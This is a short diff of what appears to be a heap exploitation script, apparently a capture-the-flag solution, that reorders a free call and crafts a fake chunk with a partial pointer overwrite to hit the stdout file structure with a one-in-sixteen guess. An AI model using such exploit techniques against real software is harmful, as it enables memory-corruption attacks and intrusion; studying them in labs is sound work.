@@ -42,9 +42,9 @@ create(0x68,p64(0)*3+p64(0xa1))		#6
 
 ###GET UNSORTED BIN ADDR ONTO HEAP
 delete(5)
-delete(0)
 
 ###GUESS STDOUT FILE STRUCT WITH 1/16 CHANCE
+delete(0)
 mblock = p64(0)*3+p64(0x71)+b'\xdd\x45'
 create(0x68,mblock)			#7
 
